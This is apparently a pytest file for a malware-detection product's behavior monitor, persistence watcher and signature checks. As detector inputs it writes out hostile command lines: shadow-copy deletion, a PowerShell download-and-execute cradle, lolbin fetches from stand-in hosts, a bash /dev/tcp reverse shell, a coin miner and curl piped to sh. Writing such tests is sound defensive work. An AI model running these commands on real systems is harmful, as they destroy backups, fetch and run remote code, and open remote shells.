import os
import shutil
import subprocess
import sys
import time

import pytest

from sentinel_vision.behavior import BehaviorMonitor, evaluate_process
from sentinel_vision.engines.authenticode import Signature, verify
from sentinel_vision.engines.base import Severity


def names(findings):
    return {f.name for f in findings}


def test_ransomware_recovery_inhibition_is_critical_and_killable():
    f = evaluate_process("vssadmin.exe", "vssadmin.exe Delete Shadows /All /Quiet")
    assert f[0].severity == Severity.CRITICAL and f[0].terminate
    assert evaluate_process("wmic.exe", "wmic shadowcopy delete")
    assert evaluate_process("bcdedit.exe", "bcdedit /set {default} recoveryenabled No")
    assert evaluate_process("wbadmin.exe", "wbadmin delete catalog -quiet")
    mention = evaluate_process("notepad.exe", 'notepad "how vssadmin delete shadows works.txt"')
    assert mention and not mention[0].terminate  # reported, but an editor is never killed


def test_office_spawning_shell():
    assert "Behavior.Office.SpawnsShell" in names(
        evaluate_process("powershell.exe", "powershell -c whoami", parent="WINWORD.EXE")
    )
    assert not evaluate_process("cmd.exe", "cmd /c dir", parent="explorer.exe")


def test_powershell_rules():
    cradle = "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\""
    assert "Behavior.PowerShell.DownloadExecute" in names(evaluate_process("powershell.exe", cradle))
    enc = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand " + "A" * 80
    assert names(evaluate_process("powershell.exe", enc)) == {"Behavior.PowerShell.HiddenEncoded"}
    assert not evaluate_process("powershell.exe", "powershell -File build.ps1 -Configuration Release")


def test_lolbins_and_unix_rules():
    assert evaluate_process("certutil.exe", "certutil -urlcache -split -f http://x/p.exe p.exe")
    assert evaluate_process("mshta.exe", "mshta https://evil.test/a.hta")
    assert evaluate_process("regsvr32.exe", "regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll")
    assert evaluate_process("bash", "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    assert names(evaluate_process("xmrig", "./xmrig -o stratum+tcp://pool:3333")) == {"Behavior.CoinMiner"}
    low = evaluate_process("sh", "sh -c curl -fsSL https://get.example.com | sh")
    assert low and low[0].severity == Severity.LOW
    assert not evaluate_process("python3", "python3 -m http.server 8000")


@pytest.fixture
def monitor(sentinel):
    return BehaviorMonitor(sentinel.scanner, sentinel.settings, snapshot_fn=lambda: {})


def test_process_watcher_flags_new_miner(sentinel, monitor):
    seen = []
    monitor.add_listener(seen.append)
    monitor.poll_processes()  # baseline
    proc = subprocess.Popen(
        [sys.executable, "-c", "import time; time.sleep(30)", "stratum+tcp://pool.example:3333"],
    )
    try:
        deadline = time.time() + 10
        while time.time() < deadline and not any(e.pid == proc.pid for e in seen):
            monitor.poll_processes()
            time.sleep(0.2)
        hit = [e for e in seen if e.pid == proc.pid]
        assert hit and hit[0].name == "Behavior.CoinMiner" and hit[0].action == "reported"
        assert proc.poll() is None  # report-only rule: not killed
        assert any(d.origin == "behavior" for d in sentinel.db.recent_detections())
    finally:
        proc.kill()
        proc.wait()


def test_confirmed_malware_process_is_terminated(sentinel, monitor):
    """A running program whose executable is on the hash blocklist gets ended."""
    sentinel.settings.auto_quarantine = False  # never quarantine the test interpreter itself
    exe = os.path.realpath(sys.executable)
    with open(exe, "rb") as fh:
        import hashlib

        digest = hashlib.sha256(fh.read()).hexdigest()
    sentinel.db.add_hashes([(digest, "Test.Blocklisted.Program")], "unit-test")
    proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"])
    try:
        ev = monitor.check_executable(exe, proc.pid, "python")
        assert ev is not None and ev.action == "terminated"
        proc.wait(timeout=10)
        assert proc.returncode is not None
    finally:
        if proc.poll() is None:
            proc.kill()


def test_persistence_watcher_diffs_and_scans(sentinel, tmp_path, eicar):
    startup = tmp_path / "Startup"
    startup.mkdir()
    entries = {"reg:HKCU\\Run\\Updater": "C:\\legit\\updater.exe"}

    def snap():
        from sentinel_vision.behavior import _file_entries

        return {**entries, **_file_entries([startup])}

    mon = BehaviorMonitor(sentinel.scanner, sentinel.settings, snapshot_fn=snap)
    assert mon.poll_persistence() == []  # first run only records a baseline
    assert mon.poll_persistence() == []  # nothing changed
    (startup / "evil.bat").write_bytes(eicar)
    entries["reg:HKCU\\Run\\SentinelVision"] = '"C:\\Program Files\\Sentinel Vision\\SentinelVision.exe" --minimized'
    events = mon.poll_persistence()
    assert len(events) == 1  # our own Run value is ignored
    ev = events[0]
    assert ev.severity == Severity.HIGH and "evil.bat" in ev.description
    assert ev.action == "quarantined" and not (startup / "evil.bat").exists()


def test_authenticode_api_is_safe_everywhere(tmp_path):
    f = tmp_path / "not-signed.exe"
    f.write_bytes(b"MZ" + b"\0" * 1000)
    result = verify(str(f))
    if sys.platform == "win32":
        assert result in (Signature.UNSIGNED, Signature.UNTRUSTED)
    else:
        assert result is Signature.UNAVAILABLE


@pytest.mark.skipif(sys.platform != "win32", reason="WinVerifyTrust is Windows-only")
def test_authenticode_detects_valid_and_tampered(tmp_path):
    candidates = [
        sys.executable,
        os.path.join(os.path.dirname(sys.executable), "pythonw.exe"),
        r"C:\Program Files\PowerShell\7\pwsh.exe",
        r"C:\Program Files\Git\cmd\git.exe",
        r"C:\Program Files\Microsoft Visual Studio\Installer\vswhere.exe",
        r"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe",
    ]
    signed = next((c for c in candidates if os.path.exists(c) and verify(c) is Signature.VALID), None)
    if signed is None:
        pytest.skip("no embedded-signature binary available on this machine")
    copy = tmp_path / "copy.exe"
    shutil.copyfile(signed, copy)
    assert verify(str(copy)) is Signature.VALID
    data = bytearray(copy.read_bytes())
    data[len(data) // 3] ^= 0xFF
    copy.write_bytes(bytes(data))
    assert verify(str(copy)) is Signature.TAMPERED


@pytest.mark.skipif(sys.platform != "win32", reason="Authenticode is Windows-only")
def test_pattern_hits_on_signed_programs_are_report_only(sentinel, tmp_path):
    from sentinel_vision.config import sub_dir

    candidates = [
        sys.executable,
        os.path.join(os.path.dirname(sys.executable), "pythonw.exe"),
        r"C:\Program Files\PowerShell\7\pwsh.exe",
        r"C:\Program Files\Git\cmd\git.exe",
    ]
    signed = next((c for c in candidates if os.path.exists(c) and verify(c) is Signature.VALID), None)
    if signed is None:
        pytest.skip("no embedded-signature binary available on this machine")
    (sub_dir("rules/custom") / "all_pe.yar").write_text(
        'rule Test_Any_PE { meta: severity = "high" condition: uint16(0) == 0x5A4D }'
    )
    sentinel.scanner.reload_signatures()
    copy = tmp_path / "signed.exe"
    shutil.copyfile(signed, copy)
    res = sentinel.scanner.scan_file(copy, act=False, use_cache=False)[0]
    hit = next(d for d in res.detections if d.name == "Test_Any_PE")
    assert hit.severity == Severity.MEDIUM and hit.details.get("signed")
    assert sentinel.scanner.should_quarantine(res) is False
    data = bytearray(copy.read_bytes())
    data[len(data) // 3] ^= 0xFF
    copy.write_bytes(bytes(data))
    res2 = sentinel.scanner.scan_file(copy, act=False, use_cache=False)[0]
    hit2 = next(d for d in res2.detections if d.name == "Test_Any_PE")
    assert hit2.severity == Severity.HIGH and sentinel.scanner.should_quarantine(res2) is True
